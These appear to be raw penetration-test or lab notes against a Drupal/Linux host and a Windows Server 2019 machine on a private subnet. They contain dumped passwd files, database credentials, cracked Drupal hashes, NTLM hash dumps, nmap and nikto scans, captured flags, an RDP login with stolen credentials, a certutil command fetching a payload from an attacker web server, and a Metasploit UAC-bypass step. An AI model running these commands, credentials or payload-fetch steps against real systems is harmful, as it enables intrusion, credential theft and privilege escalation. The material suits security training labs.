lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
rtkit:x:113:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
xrdp:x:114:122::/run/xrdp:/usr/sbin/nologin
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:117:123:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:118:124:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
pulse:x:119:125:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:120:127::/var/lib/geoclue:/usr/sbin/nologin
saned:x:121:129::/var/lib/saned:/usr/sbin/nologin
colord:x:122:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
sddm:x:123:131:Simple Desktop Display Manager:/var/lib/sddm:/bin/false
gdm:x:124:132:Gnome Display Manager:/var/lib/gdm3:/bin/false
auditor:x:1001:1001::/home/auditor:/bin/bash
dbadmin:x:1002:1002::/home/dbadmin:/bin/bash
mysql:x:125:133:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:126:137:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```
*   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'port' => 3306,
 *   'prefix' => 'myprefix_',
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'prefix' => 'main_',
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 * by using the 'prefix' setting. If a prefix is specified, the table
 * To have all database names prefixed, set 'prefix' as a string:
 *   'prefix' => 'main_',
 * To provide prefixes for specific tables, set 'prefix' as an array.
 *   'prefix' => array(
 *   'prefix' => array(
 *     'driver' => 'mysql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *     'driver' => 'pgsql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *     'driver' => 'sqlite',
 *     'database' => '/path/to/databasefilename',
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'syntex0421',
      'host' => 'localhost',
      'port' => '3306',
      'driver' => 'mysql',
      'prefix' => '',
 *   $drupal_hash_salt = file_get_contents('/home/example/salt.txt');
$drupal_hash_salt = 'e-5a2o6PCMfkMD1w-sV496_xJRE8sKku2o3CKeyTM9c';

mysql -u drupal --password='syntex0421' -e 'use drupal; select * from users'

admin   $S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH admin@syntex.com
auditor $S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC auditor@syntex.com qwertyuiop
dbadmin $S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN dbadmin@syntex.com sayang
Vincenzo$S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu vincenzo@syntex.com 789456

+--------+-------------------------------------------+
| User   | Password                                  |
+--------+-------------------------------------------+
| root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 |
| root   | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 |
| drupal | *7C695400AEECFFAD9251CB1CF2DC6CE8A143FCE9 |
+--------+-------------------------------------------+

```

```r
---------------------------------------------------------------------------------------
Nmap scan report for ip-192-168-100-52.eu-central-1.compute.internal (192.168.100.52)
Host is up (0.00081s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f4:d8:91:dc:37:d1:9c:90:42:7b:e3:d2:e3:b3:36:8e (RSA)
|   256 15:c6:7e:53:55:1c:08:13:20:af:3b:c9:b6:26:47:f3 (ECDSA)
|_  256 7e:d8:00:7c:4a:73:f5:02:10:44:2e:ab:39:ce:7e:36 (ED25519)
80/tcp   open  http          Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-02-21 17:28  drupal/
|_
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.13.17-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 37
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, SupportsLoadDataLocal, FoundRows, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Ui0R-)'&*@Bkt'b:7E5x
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server xrdp
MAC Address: 02:15:59:A5:8F:D5 (Unknown)
Service Info: Host: IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.13.17-Ubuntu)
|   Computer name: ip-192-168-100-52
|   NetBIOS computer name: IP-192-168-100-52\x00
|   Domain name: eu-central-1.compute.internal
|   FQDN: ip-192-168-100-52.eu-central-1.compute.internal
|_  System time: 2023-12-08T09:24:19+00:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: IP-192-168-100-, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2023-12-08T09:24:21
|_  start_date: N/A

Post-scan script results:
| clock-skew: 
|   0s: 
|     192.168.100.51 (ip-192-168-100-51.eu-central-1.compute.internal)
|     192.168.100.52 (ip-192-168-100-52.eu-central-1.compute.internal)
|_    192.168.100.50 (ip-192-168-100-50.eu-central-1.compute.internal)

```

```r
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /: Directory indexing found.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /./: Directory indexing found.
+ /./: Appending '/./' to a directory allows indexing
+ OSVDB-3268: //: Directory indexing found.
+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ OSVDB-3268: /%2e/: Directory indexing found.
+ OSVDB-576: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ OSVDB-3268: ///: Directory indexing found.
+ OSVDB-119: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-119: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when   /'s are requested.
+ 7915 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2023-12-08 15:23:50 (GMT5.5) (47 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

```r
- Your Drupal usernames are exactly the same as your user account passwords on this server. Contact me to get your Drupal passwords.
```

## 192.168.100.55 Winserver 3

```
SMB
lawrence:computadora
admin:blanca

User flag:eee323333273420291b0874803f71dc4
Administrator flag:a89c738b67554303be5b83405d0bca96

xfreerdp /u:admin /p:blanca /v:192.168.100.55
certutil -urlcache -split -f http://webserver/payload
get session and:
exploit(windows/local/bypassuac_silentcleanup)

admin:1011:aad3b435b51404eeaad3b435b51404ee:0f2011271b98907e6d288066567d3319:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:61fb34469b9989b01be4e8630c52eed6:::swordfish
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lawrence:1009:aad3b435b51404eeaad3b435b51404ee:18aa104784f77431563b1a1b67f6096c:::
mary:1010:aad3b435b51404eeaad3b435b51404ee:11637a16fca11b3604e3e68d5221b3c7:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::

```

```r
Host script results:
| smb-ls: Volume \\192.168.100.55\Users
|   maxfiles limit reached (10)
| SIZE   TIME                 FILENAME
| <DIR>  2018-09-15T06:09:26  .
| <DIR>  2018-09-15T06:09:26  ..
| <DIR>  2022-04-19T02:51:56  admin
| <DIR>  2022-04-19T02:52:08  admin\3D Objects
| <DIR>  2022-04-19T02:52:08  admin\Contacts
| <DIR>  2022-04-19T02:51:56  admin\Desktop
| <DIR>  2022-04-19T02:51:56  admin\Documents
| <DIR>  2022-04-19T02:51:56  admin\Downloads
| <DIR>  2022-04-19T02:51:56  admin\Favorites
| 34     2023-12-08T16:59:02  admin\flag.txt
|_
| smb-enum-shares: 
|   account_used: admin
|   \\192.168.100.55\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.168.100.55\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.168.100.55\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\192.168.100.55\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ
```

```r
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-08 15:28 IST
Nmap scan report for ip-192-168-100-55.eu-central-1.compute.internal (192.168.100.55)
Host is up (0.00053s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-12-08T09:59:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINSERVER-03
| Not valid before: 2023-12-07T09:13:48
|_Not valid after:  2024-06-07T09:13:48
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-03
|   NetBIOS_Domain_Name: WINSERVER-03
|   NetBIOS_Computer_Name: WINSERVER-03
|   DNS_Domain_Name: WINSERVER-03
|   DNS_Computer_Name: WINSERVER-03
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-08T09:59:03+00:00
MAC Address: 02:C1:C0:25:B0:FF (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/8%OT=80%CT=1%CU=36779%PV=Y%DS=1%DC=D%G=Y%M=02C1C0%T
OS:M=6572E8ED%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: WINSERVER-03, NetBIOS user: <unknown>, NetBIOS MAC: 02:c1:c0:25:b0:ff (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: WINSERVER-03
|   NetBIOS computer name: WINSERVER-03\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-12-08T09:59:03+00:00
| smb2-time: 
|   date: 2023-12-08T09:59:03
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

```

```r
+ Server: Microsoft-IIS/10.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 7915 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-12-08 15:27:34 (GMT5.5) (12 seconds)
---------------------------------------------------------------------------
```

```
enum4linux:

S-1-5-21-3688751335-3073641799-161370460-1008 WINSERVER-03\student (Local User)
S-1-5-21-3688751335-3073641799-161370460-1009 WINSERVER-03\lawrence (Local User)
S-1-5-21-3688751335-3073641799-161370460-1010 WINSERVER-03\mary (Local User)
S-1-5-21-3688751335-3073641799-161370460-1011 WINSERVER-03\admin (Local User)

```

## Subnet

```
[*] ARP Scanning 192.168.0.0/24
[*] IP: 192.168.0.2 MAC 02:09:25:93:c7:59
[*] IP: 192.168.0.1 MAC 02:09:25:93:c7:59
[*] IP: 192.168.0.50 MAC 02:0e:a1:64:7a:eb
[*] IP: 192.168.0.51 MAC 02:00:f3:23:08:53
[*] IP: 192.168.0.57 MAC 02:95:e3:d7:df:b9
[*] IP: 192.168.0.61 MAC 02:d3:40:3c:d1:df
[*] IP: 192.168.0.255 MAC 02:0e:a1:64:7a:eb

[+] 192.168.0.50:         - 192.168.0.50:3389 - TCP OPEN - Windows IIS 10.0
[+] 192.168.0.50:         - 192.168.0.50:80 - TCP OPEN - ?

[+] 192.168.0.51:         - 192.168.0.51:22 - TCP OPEN
[+] 192.168.0.51:         - 192.168.0.51:80 - TCP OPEN - Ubuntu 2.4.41
[+] 192.168.0.51:         - 192.168.0.51:3389 - TCP OPEN - xrdp
[+] 192.168.0.51:         - 192.168.0.51:10000 - TCP OPEN - MiniServ 1.920 (Webmin httpd)

[+] 192.168.0.57:         - 192.168.0.57:22 - TCP OPEN

[+] 192.168.0.61:         - 192.168.0.61:3389 - TCP OPEN


```